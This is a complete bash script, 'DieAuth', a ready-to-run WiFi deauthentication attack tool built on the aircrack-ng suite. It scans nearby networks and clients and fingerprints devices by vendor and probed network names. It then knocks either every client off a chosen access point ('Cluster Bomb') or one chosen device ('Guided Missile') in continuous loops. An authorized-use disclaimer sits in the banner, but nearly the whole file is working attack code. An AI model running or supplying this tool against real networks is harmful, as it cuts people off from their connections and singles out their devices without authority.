#!/bin/bash
# DieAuth - WiFi deauth tool (educational / authorized use only)

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
WHITE='\033[1;37m'
CYAN='\033[0;36m'
NC='\033[0m'

iface=""
mon_iface=""
attack_pid=""
scan_pid=""

cleanup() {
    [ -n "$mon_iface" ] && airmon-ng stop "$mon_iface" >/dev/null 2>&1
    if [ -n "$iface" ]; then
        ip link set "$iface" up 2>/dev/null
        rfkill unblock wifi 2>/dev/null
        systemctl restart NetworkManager 2>/dev/null || true
    fi
    echo -e "${YELLOW}[*] Interface restored.${NC}"
}

die() {
    echo -e "${RED}[!] $1${NC}"
    exit 1
}

# Get vendor from MAC OUI (first 3 octets). Tries nmap-mac-prefixes, then API fallback.
get_oui_vendor() {
    local mac="$1"
    local oui
    oui=$(echo "$mac" | tr -d ':' | cut -c1-6 | tr 'a-f' 'A-F')
    [ -z "$oui" ] || [ ${#oui} -ne 6 ] && echo "" && return
    for f in /usr/share/nmap/nmap-mac-prefixes /usr/local/share/nmap/nmap-mac-prefixes; do
        if [ -f "$f" ]; then
            local v
            v=$(grep -m1 "^${oui}" "$f" 2>/dev/null | sed 's/^[^[:space:]]*[[:space:]]*//' | head -c 50)
            [ -n "$v" ] && echo "$v" && return
        fi
    done
    # Online API fallback (short timeout; skip if offline)
    v=$(curl -s -m 2 "https://api.macvendors.com/$(echo "$mac" | tr -d ':')" 2>/dev/null)
    [ -n "$v" ] && echo "$v" || echo ""
}

# Device type hint from vendor name (e.g. Apple -> iPhone/Mac?, Samsung -> phone/TV?).
get_device_type_from_vendor() {
    local vendor="$1"
    # Trim whitespace and lowercase
    vendor=$(echo "$vendor" | tr '[:upper:]' '[:lower:]' | awk '{gsub(/^ +| +$/,"")}1')
    
    [ -z "$vendor" ] && { printf ''; return; }

    case "$vendor" in
        # Mobile / Tablets / Computers
        *apple*)                          printf 'Possible: iPhone / iPad / Mac' ;;
        *samsung*)                        printf 'Possible: Android phone / Tablet / TV' ;;
        *google*)                         printf 'Possible: Pixel phone / Chromecast / Nest' ;;
        *microsoft*)                      printf 'Possible: Windows PC / Surface / Xbox' ;;
        *xiaomi*|*redmi*|*poco*)          printf 'Possible: Xiaomi / Redmi / Poco Android' ;;
        *huawei*|*honor*)                 printf 'Possible: Huawei / Honor Android' ;;
        *oneplus*|*oppo*|*realme*|*vivo*) printf 'Possible: Android phone' ;;
        *lenovo*|*motorola*)              printf 'Possible: Lenovo / Motorola Android / PC' ;;
        *asus*)                           printf 'Possible: ASUS router / Laptop / Phone' ;;
        *dell*)                           printf 'Possible: Dell PC / Laptop' ;;
        *hp*|*hewlettpackard*)            printf 'Possible: HP PC / Laptop / Printer' ;;

        # TVs and streaming devices
        *sony*)                           printf 'Possible: Sony TV / PlayStation' ;;
        *lg*)                             printf 'Possible: LG TV / Phone' ;;
        *hisense*|*tcl*|*philips*|*panasonic*|*sharp*|*vizio*)
                                          printf 'Possible: Smart TV' ;;
        *roku*)                           printf 'Possible: Roku streaming device' ;;
        *amazon*|*kindle*|*lab126*)       printf 'Possible: Fire TV / Echo / Kindle' ;;

        # Gaming consoles
        *nintendo*)                       printf 'Possible: Nintendo console' ;;

        # Networking / IoT
        *tp-link*|*tplink*)               printf 'Possible: TP-Link router / IoT' ;;
        *d-link*|*dlink*)                 printf 'Possible: D-Link router' ;;
        *netgear*)                        printf 'Possible: Netgear router' ;;
        *ubiquiti*|*unifi*)               printf 'Possible: Ubiquiti AP / router' ;;
        *espressif*)                      printf 'Possible: ESP32 / ESP8266 IoT' ;;
        *raspberrypi*|*raspberry\ pi*)    printf 'Possible: Raspberry Pi' ;;

        # Printers (common in networks)
        *canon*|*brother*|*epson*)        printf 'Possible: Printer' ;;

        # WiFi / embedded chipsets (fallback)
        *intel*|*broadcom*|*qualcomm*|*atheros*|*mediatek*)
                                          printf 'Possible: Laptop / Phone WiFi chipset' ;;
        *murata*|*liteon*|*quectel*|*azurewave*|*foxconn*)
                                          printf 'Possible: Embedded WiFi module' ;;

        # Anything else
        *)                                printf 'Unknown' ;;
    esac
}

# Device hint from Probed ESSIDs (e.g. iPhone, Android, Smart TV).
get_device_hint_from_probes() {
    local probed="$1"
    probed=$(echo "$probed" | tr 'A-Z' 'a-z')
    [ -z "$probed" ] && echo "" && return
    case "$probed" in
        *iphone*|*ipad*)                     echo "iPhone/iPad?" ;;
        *android*|*galaxy*|*redmi*|*mi\ *|*poco*)
                                             echo "Android phone?" ;;
        *direct-*|*smart-tv*|*bravia*|*cast*|*dlna*|*airplay*)
                                             echo "Smart TV/casting?" ;;
        *samsung*tv*|*samsung\ tv* )         echo "Samsung TV?" ;;
        *lg\ smart*|*webos*)                 echo "LG Smart TV?" ;;
        *hisense*|*tcl*|*philips*|*panasonic*)
                                             echo "Smart TV?" ;;
        *roku*)                              echo "Roku?" ;;
        *fire*tv*|*aftm*|*amazon*fire*|*aft*) echo "Fire TV/Stick?" ;;
        *chromecast*|*cast-*|*googlecast*)   echo "Chromecast?" ;;
        *ps4*|*ps5*|*playstation*|*xbox*)    echo "Game console?" ;;
        *switch*|*nintendo*)                echo "Nintendo console?" ;;
        *apple*|*macbook*|*imac*)           echo "Apple device?" ;;
        *huawei*|*honor*)                   echo "Huawei phone?" ;;
        *)                                  echo "" ;;
    esac
}

# INT/TERM: kill scan/attack only; EXIT trap runs cleanup once (avoids "Interface restored" twice)
trap 'kill $attack_pid $scan_pid 2>/dev/null; exit 130' INT
trap 'kill $attack_pid $scan_pid 2>/dev/null; exit 143' TERM
trap 'cleanup; exit $?' EXIT

clear

echo -e "\n\n\n"

PAD="     "

echo -e "${PAD}${RED}▓█████▄  ██▓▓█████${NC} ▄▄▄       █    ██ ▄▄▄█████▓ ██░ ██ "
echo -e "${PAD}${RED}▒██▀ ██▌▓██ ▓█   ▀${NC}▒████▄     ██  ▓██▒▓  ██▒ ▓▒▓██░ ██▒"
echo -e "${PAD}${RED}░██   █▌▒██ ▒███  ${NC}▒██  ▀█▄  ▓██  ▒██░▒ ▓██░ ▒░▒██▀▀██░"
echo -e "${PAD}${RED}░▓█▄   ▌░██ ▒▓█  ▄${NC}░██▄▄▄▄██ ▓▓█  ░██░░ ▓██▓ ░ ░▓█ ░██ "
echo -e "${PAD}${RED}░▒████▓ ░██ ░▒████${NC}▒▓█   ▓██▒▒▒█████▓   ▒██▒ ░ ░▓█▒░██▓"
echo -e "${PAD}${RED} ▒▒▓  ▒ ░▓  ░░ ▒░ ${NC}░▒▒   ▓▒█░░▒▓▒ ▒ ▒   ▒ ░░    ▒ ░░▒░▒"
echo -e "${PAD}${RED} ░ ▒  ▒  ▒ ░ ░ ░  ${NC}░ ▒   ▒▒ ░░░▒░ ░ ░     ░     ▒ ░▒░ ░"
echo -e "${PAD}${RED} ░ ░  ░  ▒ ░   ░  ${NC}  ░   ▒    ░░░ ░ ░   ░       ░  ░░ ░"
echo -e "${PAD}${RED}   ░     ░     ░  ${NC}░     ░  ░   ░               ░  ░  ░"
echo -e "${PAD}${RED} ░                ${NC}                                    "
echo ""
echo ""
echo -e "${RED}╔══════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║  WARNING: YOU ARE SOLELY RESPONSIBLE FOR YOUR USE OF THIS TOOL.  ║${NC}"
echo -e "${RED}║  The author is NOT liable for any damages, legal trouble, or     ║${NC}"
echo -e "${RED}║  consequences caused by running this software.                   ║${NC}"
echo -e "${RED}║  Use only on networks you own or have permission to test.        ║${NC}"
echo -e "${RED}║  Unauthorized access to computer networks is illegal.            ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════════════╝${NC}"
echo ""

[[ $EUID -ne 0 ]] && die "Run as root: sudo ./run.sh"

# --- [1] Wireless interface selection ---
echo -e "${GREEN}[1] Select wireless interface${NC}"
wifi_ifaces=()
while read -r name; do
    [ -z "$name" ] && continue
    [ -e "/sys/class/net/$name" ] && wifi_ifaces+=("$name")
done < <(iw dev 2>/dev/null | awk '/^\tInterface/{print $2}')

[ ${#wifi_ifaces[@]} -eq 0 ] && die "No wireless interfaces detected. Is your WiFi adapter connected and supported?"

echo -e "  Detected wireless interface(s) on this device:"
for i in "${!wifi_ifaces[@]}"; do
    echo -e "    $((i+1))) ${wifi_ifaces[$i]}"
done
echo ""
read -p "Enter number or interface name: " choice
choice=$(echo "$choice" | xargs)

iface=""
if [[ "$choice" =~ ^[0-9]+$ ]] && [ "$choice" -ge 1 ] && [ "$choice" -le ${#wifi_ifaces[@]} ]; then
    iface="${wifi_ifaces[$((choice-1))]}"
elif [[ -n "$choice" ]]; then
    for w in "${wifi_ifaces[@]}"; do
        [[ "$w" == "$choice" ]] && iface="$w" && break
    done
fi

[ -z "$iface" ] && die "Invalid choice. Enter a number from the list or the exact interface name."
echo -e "${GREEN}[+] Using interface: $iface${NC}"
echo ""

# --- Enable monitor mode (kill interfering processes first so interface stays in monitor mode) ---
echo -e "${GREEN}[2] Enabling monitor mode on $iface...${NC}"
echo -e "  Stopping NetworkManager, wpa_supplicant, etc. (they would reclaim the interface otherwise)."
airmon-ng check kill >/dev/null 2>&1
airmon_out=$(airmon-ng start "$iface" 2>&1)
[ $? -ne 0 ] && echo "$airmon_out" | sed 's/^/    /' && die "airmon-ng failed."

mon_iface=""
if echo "$airmon_out" | grep -qE "already enabled for|enabled on"; then
    parsed=$(echo "$airmon_out" | grep -oE '\](wlan[0-9]+|mon[0-9]+)' 2>/dev/null | head -1 | tr -d ']')
    [ -z "$parsed" ] && parsed="$iface"
    ip link show "$parsed" &>/dev/null && mon_iface="$parsed"
fi
[ -z "$mon_iface" ] && echo "$airmon_out" | grep -q "monitor mode enabled" && parsed=$(echo "$airmon_out" | grep -B1 "monitor mode enabled" | grep -E "^\s*phy|^[[:space:]]*phy" | head -1 | awk '{print $2}') && [ -n "$parsed" ] && [ "$parsed" != "airmon" ] && ip link show "$parsed" &>/dev/null && mon_iface="$parsed"
[ -z "$mon_iface" ] && iw dev "$iface" info 2>/dev/null | grep -q "type monitor" && mon_iface="$iface"
[ -z "$mon_iface" ] && ip link show "${iface}mon" &>/dev/null && mon_iface="${iface}mon"
if [ -z "$mon_iface" ]; then
    for i in $(iw dev 2>/dev/null | awk '/Interface/{print $2}'); do
        iw dev "$i" info 2>/dev/null | grep -q "type monitor" && mon_iface="$i" && break
    done
fi
[ -z "$mon_iface" ] && mon_iface="$iface"

if ! ip link show "$mon_iface" &>/dev/null; then
    echo "$airmon_out" | sed 's/^/    /'
    die "Monitor interface '$mon_iface' not found. Try: airmon-ng check kill"
fi
echo -e "${GREEN}[+] Monitor interface: $mon_iface${NC}"
echo ""

# --- Attack type ---
echo -e "${GREEN}[3] Select attack type${NC}"
echo "  1) Cluster Bomb  - Deauth all devices on a chosen network (optionally exclude your MAC)"
echo "  2) Guided Missile - Deauth a single device (identify by BSSID/client list and device info)"
echo ""
read -p "Enter 1 or 2: " attack_type
attack_type=$(echo "$attack_type" | xargs)
[[ "$attack_type" != "1" && "$attack_type" != "2" ]] && die "Enter 1 or 2."
echo ""

# --- Live scan: BSSIDs and clients update every 3s; press Enter when ready (more wait = more devices) ---
echo -e "${GREEN}[4] Live scan (monitor: $mon_iface). Updates every 3s. Press Enter when ready, Ctrl+C to cancel.${NC}"
echo -e "${YELLOW}    Tip: Idle/sleeping devices often appear after 30–60s; wait longer to see more.${NC}"
echo ""
rm -f /tmp/dieauth_scan-*.csv
scan_err=$(mktemp)
airodump-ng "$mon_iface" -w /tmp/dieauth_scan --output-format csv --write-interval 3 --background 1 </dev/null >/dev/null 2>"$scan_err" &
scan_pid=$!
# Live loop: refresh counts every 3s until user presses Enter
while true; do
    sleep 3
    csv=$(ls -t /tmp/dieauth_scan-*.csv 2>/dev/null | head -n1)
    if [ -n "$csv" ] && [ -f "$csv" ]; then
        ap_count=$(awk -F',' '/^BSSID/{h=1;next} h && $1~/^[0-9A-Fa-f]{2}:/{c++} /^$/{h=0} END{print c+0}' "$csv")
        st_count=$(awk -F',' '/^Station MAC/{h=1;next} h && NF && $1~/^[0-9A-Fa-f]{2}:/ && $6~/^[0-9A-Fa-f]{2}:/{c++} /^$/{h=0} END{print c+0}' "$csv")
        echo -ne "\r  ${CYAN}Live: ${ap_count} APs, ${st_count} clients. Press Enter when ready (or wait for more).${NC}   "
    else
        echo -ne "\r  ${CYAN}Scanning... (first CSV in ~3s)${NC}   "
    fi
    read -t 3 -r && break
done
echo ""
kill -TERM $scan_pid 2>/dev/null
wait $scan_pid 2>/dev/null
scan_pid=""
[ -s "$scan_err" ] && sed 's/^/    /' "$scan_err" | head -5
rm -f "$scan_err"
csv=$(ls -t /tmp/dieauth_scan-*.csv 2>/dev/null | head -n1)
if [ -z "$csv" ] || [ ! -f "$csv" ]; then
    echo -e "${RED}[!] No CSV file was written.${NC}"
    die "Scan produced no data. Try: iw dev $mon_iface info (should show type monitor)."
fi
echo -e "${GREEN}[+] Scan done. Using latest capture.${NC}"
echo ""

# Parse APs: BSSID, channel, Power, ESSID (cols 1,4,9,14); trim spaces (CSV has "  7", " -59", etc.)
declare -A ap_essid ap_ch ap_pwr
while IFS=, read -r bssid _ _ ch _ _ _ _ pwr _ _ _ _ essid _; do
    [[ "$bssid" == "BSSID" || -z "$bssid" || "$bssid" =~ Station ]] && continue
    bssid=$(echo "$bssid" | xargs)
    ch=$(echo "$ch" | xargs)
    pwr=$(echo "$pwr" | xargs)
    essid=$(echo "$essid" | tr -d '"' | xargs)
    [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
    ap_essid[$bssid]="$essid"
    ap_ch[$bssid]="$ch"
    ap_pwr[$bssid]="$pwr"
done < <(awk -F',' '/^BSSID/{h=1;next} h && NF && $1~/^[0-9A-Fa-f]{2}:/{print} /^$/{h=0}' "$csv")

# If no APs parsed, show a hint and first lines of CSV for debugging
if [ ${#ap_essid[@]} -eq 0 ]; then
    echo -e "${RED}[!] No BSSIDs found in scan output.${NC}"
    echo "    First 15 lines of CSV:"
    head -15 "$csv" | sed 's/^/    /'
    die "Scan produced no APs. Check that $mon_iface is in monitor mode and within range of networks."
fi

# Parse Stations: Station MAC, Power, BSSID, Probed ESSIDs (cols 1,4,6,7)
# Only stations that are associated (BSSID is a MAC)
station_list=()
while IFS=, read -r stamac _ _ pwr _ bssid probed; do
    [[ "$stamac" == "Station" || -z "$stamac" ]] && continue
    stamac=$(echo "$stamac" | xargs)
    bssid=$(echo "$bssid" | xargs)
    probed=$(echo "$probed" | tr -d '"' | xargs)
    [[ ! "$stamac" =~ ^[0-9A-Fa-f]{2}: ]] && continue
    [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
    station_list+=("$stamac|$bssid|$pwr|$probed")
done < <(awk -F',' '/^Station/{h=1;next} h && NF {print} /^$/{h=0}' "$csv")

# ========== Cluster Bomb ==========
if [ "$attack_type" == "1" ]; then
    echo -e "${CYAN}--- Cluster Bomb: choose target AP (all clients on that network will be deauthenticated) ---${NC}"
    echo -e "${WHITE} #   BSSID              CH  PWR  ESSID${NC}"
    echo -e "${WHITE} --- ----------------- --- ---- ------${NC}"
    ap_list=()
    idx=1
    for b in "${!ap_essid[@]}"; do
        ap_list[$idx]="$b"
        printf " %2d  %-18s  %3s  %4s  %s\n" "$idx" "$b" "${ap_ch[$b]}" "${ap_pwr[$b]}" "${ap_essid[$b]}"
        idx=$((idx+1))
    done
    [ ${#ap_list[@]} -eq 0 ] && die "No APs found in scan."
    echo ""
    read -p "AP number: " ap_num
    ap_num=$(echo "$ap_num" | xargs)
    [[ ! "$ap_num" =~ ^[0-9]+$ ]] || [ "$ap_num" -lt 1 ] || [ "$ap_num" -gt ${#ap_list[@]} ] && die "Invalid number."
    target_bssid="${ap_list[$ap_num]}"
    target_ch=$(echo "${ap_ch[$target_bssid]}" | xargs)
    target_essid="${ap_essid[$target_bssid]}"
    echo -e "${GREEN}[+] Target: $target_essid ($target_bssid) channel $target_ch${NC}"
    echo ""
    read -p "Your device MAC (leave blank to deauth everyone including yourself if on this interface): " my_mac
    my_mac=$(echo "$my_mac" | xargs)

    if [ -n "$target_ch" ] && [ "$target_ch" != "0" ] && [ "$target_ch" != "-1" ]; then
        iw dev "$mon_iface" set channel "$target_ch" 2>/dev/null || iwconfig "$mon_iface" channel "$target_ch" >/dev/null 2>&1
    fi

    # Build client list for this AP (even if user didn't give their MAC, we still prefer client-directed deauths)
    clients=()
    for line in "${station_list[@]}"; do
        IFS='|' read -r stamac bssid _ _ <<< "$line"
        if [ -n "$my_mac" ] && [ "$stamac" = "$my_mac" ]; then
            continue
        fi
        [[ "$bssid" == "$target_bssid" ]] && clients+=("$stamac")
    done

    if [ -z "$my_mac" ]; then
        if [ ${#clients[@]} -gt 0 ]; then
            echo -e "\n${RED}[*] Cluster Bomb: deauthing ${#clients[@]} client(s) on $target_bssid (includes your own device if associated). Ctrl+C to stop${NC}"
            echo -e "${YELLOW}    Using strong client-directed deauths plus broadcast as fallback.${NC}"
            while true; do
                for c in "${clients[@]}"; do
                    aireplay-ng --deauth 10 --ignore-negative-one -a "$target_bssid" -c "$c" "$mon_iface"
                done
                # Also send broadcast deauths in case some clients aren't in the list
                aireplay-ng --deauth 10 --ignore-negative-one -a "$target_bssid" "$mon_iface"
                sleep 1
            done
        else
            echo -e "\n${RED}[*] Cluster Bomb: no clients seen for $target_bssid, falling back to broadcast deauth (includes your own device). Ctrl+C to stop${NC}"
            aireplay-ng --deauth 0 --ignore-negative-one -a "$target_bssid" "$mon_iface" &
            attack_pid=$!
            wait $attack_pid
        fi
    else
        [[ ! "$my_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] && die "Invalid MAC format."
        # Filter out your MAC from clients (we already excluded in the loop above)
        if [ ${#clients[@]} -eq 0 ]; then
            echo -e "${YELLOW}[*] No other clients found on this AP (or only your MAC). Exiting.${NC}"
            exit 0
        fi
        echo -e "\n${RED}[*] Cluster Bomb: deauthing ${#clients[@]} client(s) (excluding $my_mac). Ctrl+C to stop${NC}"
        echo -e "${YELLOW}    Sending 10 deauths per client per round with --ignore-negative-one (single deauths are often ignored).${NC}"
        while true; do
            for c in "${clients[@]}"; do
                aireplay-ng --deauth 10 --ignore-negative-one -a "$target_bssid" -c "$c" "$mon_iface"
            done
            sleep 1
        done
    fi
fi

# ========== Guided Missile ==========
if [ "$attack_type" == "2" ]; then
    echo -e "${CYAN}--- Guided Missile: choose one client (Vendor/Device helps identify your phone, TV, etc.) ---${NC}"
    echo -e "${WHITE} #   Client MAC          BSSID              CH  ESSID        PWR  Vendor / Device${NC}"
    echo -e "${WHITE} --- ------------------ ------------------ --- ------------ ---- -------------------------${NC}"
    client_choices=()
    idx=1
    for line in "${station_list[@]}"; do
        IFS='|' read -r stamac bssid pwr probed <<< "$line"
        essid="${ap_essid[$bssid]:-(unknown)}"
        ch="${ap_ch[$bssid]}"
        vendor=$(get_oui_vendor "$stamac")
        type_from_vendor=$(get_device_type_from_vendor "$vendor")
        hint_from_probes=$(get_device_hint_from_probes "$probed")
        if [ -n "$vendor" ]; then
            if [ -n "$type_from_vendor" ]; then
                dev_col="$vendor ($type_from_vendor)"
            elif [ -n "$hint_from_probes" ]; then
                dev_col="$vendor | $hint_from_probes"
            else
                dev_col="$vendor"
            fi
        elif [ -n "$hint_from_probes" ]; then
            dev_col="$hint_from_probes"
        else
            dev_col="—"
        fi
        client_choices[$idx]="$stamac|$bssid"
        printf " %2d  %-18s  %-18s  %3s  %-12s  %4s  %s\n" "$idx" "$stamac" "$bssid" "$ch" "$essid" "$pwr" "$dev_col"
        idx=$((idx+1))
    done
    [ ${#client_choices[@]} -eq 0 ] && die "No associated clients found in scan."
    echo ""
    read -p "Client number to deauth: " client_num
    client_num=$(echo "$client_num" | xargs)
    [[ ! "$client_num" =~ ^[0-9]+$ ]] || [ "$client_num" -lt 1 ] || [ "$client_num" -gt ${#client_choices[@]} ] && die "Invalid number."
    IFS='|' read -r target_client target_bssid <<< "${client_choices[$client_num]}"
    target_ch=$(echo "${ap_ch[$target_bssid]}" | xargs)
    target_essid="${ap_essid[$target_bssid]}"
    echo -e "${GREEN}[+] Target client: $target_client on $target_essid ($target_bssid) ch $target_ch${NC}"
    # Must set interface to target AP's channel or aireplay fails with "No such BSSID"
    if [ -n "$target_ch" ] && [ "$target_ch" != "0" ] && [ "$target_ch" != "-1" ]; then
        if iw dev "$mon_iface" set channel "$target_ch" 2>/dev/null; then
            echo -e "${YELLOW}[*] Set $mon_iface to channel $target_ch for attack.${NC}"
        else
            iwconfig "$mon_iface" channel "$target_ch" >/dev/null 2>&1
        fi
    fi
    echo -e "\n${RED}[*] Guided Missile: deauthing $target_client (Ctrl+C to stop)${NC}"
    aireplay-ng --deauth 0 --ignore-negative-one -a "$target_bssid" -c "$target_client" "$mon_iface" &
    attack_pid=$!
    wait $attack_pid
fi

exit 0
